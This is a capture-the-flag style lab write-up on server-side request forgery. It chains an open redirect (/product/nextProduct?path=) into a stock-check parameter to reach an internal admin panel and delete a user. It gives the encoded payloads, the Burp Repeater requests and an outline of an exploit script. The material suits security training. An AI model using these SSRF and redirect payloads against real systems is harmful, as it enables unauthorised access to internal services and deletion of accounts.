### Lab: SSRF with filter bypass via open redirection vulnerability

This lab has a stock check feature which fetches data from an internal system.  
To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

_____

Analysis and Exploit:

1. Stock Check functionality at **/product/post**
    - stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    - stockApi=/product/stock/check?productId=1&storeId=1
2. In product page there is a link _Next product_:
    - GET /product/nextProduct?currentProductId=1&path=/product?productId=2

3. 1st - **[BURP-REPEATER]** stockApi=/product/stock/check%3fproductId%3d1%26storeId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
  
(stockApi=/product/stock/check?productId=1&storeId=1&path=http://192.168.0.12:8080/admin) returns status code 200 and stock value
WRONG!!! NOT AN OPEN REDIRECT!!

4. 2nd - **[BURP-REPEATER]** GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
    - HTTP/2 302 Found
5. **[BURP-REPEATER]** POST request with payload as value for 'stockApi'
    - stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin

    (stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin)
6. **[BURP-REPEATER]** POST request to delete user
    - stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
        - Upon success : "User deleted successfully!"
    (/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos)

_____

Script:

1. Delete user _carlos_ | POST **/product/stock** | params: stockApi
    - stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
    - check if "User deleted successfully!" in response text

    